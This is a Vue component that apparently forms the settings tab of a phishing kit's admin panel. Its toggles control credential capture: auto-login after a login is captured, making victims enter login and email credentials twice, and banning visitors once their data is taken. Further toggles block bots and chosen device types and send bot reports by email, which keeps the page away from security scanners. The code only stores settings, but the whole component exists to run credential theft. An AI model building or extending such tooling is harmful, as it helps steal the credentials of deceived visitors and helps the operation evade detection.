<template>
  <div class="p-fluid grid">
    <div class="col-12 md:col-6" style="border: 1px solid lightgray;">
      <div class="card border-round">
        <h1 class="font-bold mb-2 flex align-items-center"><i class="pi pi-shield mr-2"></i> Security Features</h1>
        <p class="text-gray-500 mb-4">Configure security and authentication features</p>
        <div class="formgrid grid wrapper switch-div">
          <div class="field col-12 flex justify-content-between align-items-center">
            <div>
              <label for="auto-login">Auto Login</label>
              <p class="text-sm text-gray-500">Auto login user after successful login capture</p>
            </div>
            <ToggleSwitch 
              v-model="form.autoLogin" 
              @update:model-value="(value) => handleToggleChange('autoLogin', value)"
              aria-label="Auto Login" 
            />
          </div>
          <div class="field col-12 flex justify-content-between align-items-center">
            <div>
              <label for="dual-login">Dual Login</label>
              <p class="text-sm text-gray-500">Force visitors to enter login credentials twice</p>
            </div>
            <ToggleSwitch 
              v-model="form.dualLogin" 
              @update:model-value="(value) => handleToggleChange('dualLogin', value)"
              aria-label="Dual Login" 
            />
          </div>
          <div class="field col-12 flex justify-content-between align-items-center">
            <div>
              <label for="dual-email">Dual Email Access</label>
              <p class="text-sm text-gray-500">Force visitors to enter email credentials twice</p>
            </div>
            <ToggleSwitch 
              v-model="form.dualEmailAccess" 
              @update:model-value="(value) => handleToggleChange('dualEmailAccess', value)"
              aria-label="Dual Email Access" 
            />
          </div>
          <div class="field col-12 flex justify-content-between align-items-center">
            <div>
              <label for="ban-on-success">Ban on Success</label>
              <p class="text-sm text-gray-500">Ban visitors after successfully capturing data</p>
            </div>
            <ToggleSwitch 
              v-model="form.banOnSuccess" 
              @update:model-value="(value) => handleToggleChange('banOnSuccess', value)"
              aria-label="Ban on Success" 
            />
          </div>
        </div>
      </div>
    </div>
    <div class="col-12 md:col-6">
      <div class="card bot-section" style="border: 1px solid lightgray; margin-top: 20px;">
        <div>
          <h1 class="font-bold mb-4 flex align-items-center"><i class="pi pi-bolt mr-2"></i> Bot Protection</h1>
          <p class="text-gray-500 mb-4">Configure bot detection and blocking features</p>
        </div>
        <div class="formgrid grid ">
          <div class="field col-12 flex justify-content-between align-items-center">
            <div>
              <label for="bot-block">Bot Block Notifications</label>
              <p class="text-sm text-gray-500">Send notifications when bots are blocked</p>
            </div>
            <ToggleSwitch 
              v-model="form.botBlockNotifications" 
              @update:model-value="(value) => handleToggleChange('botBlockNotifications', value)"
              aria-label="Bot Block Notifications" 
            />
          </div>
          <div class="field col-12 flex justify-content-between align-items-center">
            <div>
              <label for="bot-info">Bot Info Reports</label>
              <p class="text-sm text-gray-500">Send detailed bot information to email</p>
            </div>
            <ToggleSwitch 
              v-model="form.botInfoReports" 
              @update:model-value="(value) => handleToggleChange('botInfoReports', value)"
              aria-label="Bot Info Reports" 
            />
          </div>
        </div>
      </div>
      <div class="card mt-4 bot-section" style="border: 1px solid lightgray;">
        <div>
          <h1 class="font-bold mb-4 flex align-items-center"><i class="pi pi-desktop mr-2"></i> Device Blocking</h1>
          <p class="text-gray-500 mb-4">Configure device-specific access controls</p>
        </div>
        <div class="formgrid grid">
          <div class="field col-12 flex justify-content-between align-items-center">
            <div>
              <label for="block-pc">Block PC Devices</label>
              <p class="text-sm text-gray-500">Prevent access from desktop/laptop computers</p>
            </div>
            <ToggleSwitch 
              v-model="form.blockPC" 
              @update:model-value="(value) => handleToggleChange('blockPC', value)"
              aria-label="Block PC Devices" 
            />
          </div>
          <div class="field col-12 flex justify-content-between align-items-center">
            <div>
              <label for="block-mobile">Block Mobile Devices</label>
              <p class="text-sm text-gray-500">Prevent access from mobile devices</p>
            </div>
            <ToggleSwitch 
              v-model="form.blockMobile" 
              @update:model-value="(value) => handleToggleChange('blockMobile', value)"
              aria-label="Block Mobile Devices" 
            />
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script lang="ts">
import { defineComponent, ref } from 'vue';
import { useStore } from "../composables/useStore"
import ToggleSwitch from './ToggleSwitch.vue';
import { } from '../store/'
export default defineComponent({
  name: 'FeaturesTab',
  components: {
    ToggleSwitch
  },
  setup() {
    const { settings, changeSetting } = useStore()
    const form = ref({ ...settings });

    const handleToggleChange = (key: string, value: boolean) => {
      // @ts-ignore
      changeSetting(key, value)
    };

    return { 
      form,
      handleToggleChange
    };
  }
});
</script>

<style scoped>
@import "../style/features.css";
</style>